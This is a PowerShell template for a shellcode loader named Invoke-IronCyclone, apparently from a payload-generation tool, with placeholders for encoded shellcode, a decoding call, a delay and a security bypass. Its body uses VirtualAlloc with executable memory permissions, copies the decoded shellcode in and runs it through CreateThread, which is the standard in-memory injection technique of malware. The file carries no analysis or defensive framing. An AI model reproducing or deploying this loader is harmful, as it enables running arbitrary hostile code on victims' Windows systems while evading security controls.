####CODE####

function Invoke-IronCyclone(){
    $Win32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds);
    }
"@
    Add-Type $Win32

    $encoded = <####SHELLCODE####>

    ####CALL####

    $size = $decoded.Length
    [IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);
    [System.Runtime.InteropServices.Marshal]::Copy($decoded, 0, $addr, $size)
    $thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
    [Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
}

####DELAY####

####BYPASS####

Invoke-IronCyclone